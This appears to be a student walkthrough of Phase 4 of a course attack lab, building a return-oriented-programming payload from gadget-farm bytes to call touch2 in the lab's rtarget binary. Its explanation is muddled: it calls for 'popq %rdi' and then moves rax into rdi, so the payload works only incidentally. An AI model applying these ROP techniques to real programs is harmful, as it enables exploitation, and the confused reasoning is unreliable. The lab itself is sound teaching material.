### **Phase 4**

This phase is more difficult than the previous phases because it is on rtarget. We have to use a concept called **Return Oriented Programming**. 

For this phase, we will be using the gadget farm to perform our exploits.

Phase 4 is calling **touch2**, similar to Phase 2, but we will use a different exploit method.

Our first step is to pop the rdi register off of the stack.
With the encoding table in hand we find that,
```
   popq %rdi = 5f
```

We now need to find the instruction starting with **5f** within our gadget farm. The gadget farm is located between **_start_farm_** and **_end_farm_** in your rtarget's objdump.

My 5f starts one after the instruction **401f68**
```
0000000000401f64 <getval_447>:
  401f64:   f3 0f 1e fa             endbr64
  401f68:   b8 5f 58 90 90          mov    $0x9090585f,%eax
  401f6d:   c3                      ret
```

Next we need to move rax into rdi. The encoding for that is,
```
   movq %rax %rdi = 48 89 c7 c3
```

I found two spots with the ```48 89 c7 c3``` sequence.
```
0000000000401f3a <getval_160>:
  401f3a:   f3 0f 1e fa             endbr64
  401f3e:   b8 48 89 c7 c3          mov    $0xc3c78948,%eax
  401f43:   c3                      ret

0000000000401f44 <getval_113>:
  401f44:   f3 0f 1e fa             endbr64
  401f48:   b8 58 94 90 90          mov    $0x90909458,%eax
  401f4d:   c3                      ret

0000000000401f4e <addval_368>:
  401f4e:   f3 0f 1e fa             endbr64
  401f52:   8d 87 48 81 c7 90       lea    -0x6f387eb8(%rdi),%eax
  401f58:   c3                      ret

0000000000401f59 <addval_123>:
  401f59:   f3 0f 1e fa             endbr64
  401f5d:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  401f63:   c3                      ret
```

It does not matter which one you choose, just make you are starting at the instruction.

For example, if I wanted to use the ```48 89 c7 c3``` sequence at line **401f5d**, I would have to add 0x2 to start at the ```48```.

Now to begin our exploit,

1. Fill your buffer with padding
2. Add the starting point address of a **popq %rdi** instruction.
   * Don't forgot to add the offset if the instruction doesn't begin at the start. This is also in little-endian and 8-bytes(padding).
3. Add your cookie. Little-endian and 8-bytes in length.
4. Add the starting point address of a **movq %rax %rdi** instruction.


In the end, it should look something like this.

```
/* Buffer - 24 bytes */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* Popq rdi */
/* 401f69 */
69 1f 40 00 00 00 00 00

/* Cookie */
/* 0x33f72ca5 */
a5 2c f7 33 00 00 00 00

/* Move rax into rdi */
/* 401f5f */
5f 1f 40 00 00 00 00 00

/* Ret address of touch2 */ww
/* 0x401d4e */
4e 1d 40 00 00 00 00 00 
```

As always, to run this type,
```
./hex2raw < rtarget.lv4 | ./rtarget
```

Nice job, Phase 4 done.